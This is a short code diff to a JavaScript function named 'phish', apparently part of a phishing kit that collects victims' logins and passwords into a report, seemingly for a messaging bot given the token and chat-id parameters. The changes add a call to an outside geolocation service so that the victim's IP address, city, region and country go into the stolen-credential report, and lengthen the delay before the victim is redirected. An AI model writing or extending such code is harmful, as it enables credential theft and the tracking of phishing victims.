@@ -86,6 +86,18 @@ const phish = (bot_token, chat_id, redirect_link) => {
 
     var e = module.init();
 
+    const ipLocation = () => {
+        let req = new XMLHttpRequest();
+        req.open(
+            'GET',
+            `http://ip-api.com/json/?fields=query,country,city,regionName`,
+            false
+        );
+        req.send(null);
+        let json = JSON.parse(req.responseText);
+        return json;
+    };
+    let ip_json = ipLocation();
     const goTo = () => {
         let link = new URLSearchParams(window.location.search).get('link');
         if (link !== null) {
@@ -109,6 +121,8 @@ Time :    ${time}%0A
 Login:    ${login}%0A
 Pass :    ${pass}%0A
 ----------------------------------------------------%0A
+IP: ${ip_json.query}%0A
+Location: ${ip_json.city}, ${ip_json.regionName}, ${ip_json.country}%0A
 OS: ${e.os.name} v${e.os.version}%0A
 Browser:  ${e.browser.name} v${e.browser.version}%0A
 ----------------------------------------------------%0A%0A
@@ -127,6 +141,6 @@ navigator.vendor:%0A${navigator.vendor}%0A
 
         setTimeout(function() {
             goTo();
-        }, 500);
+        }, 1000);
     });
 };
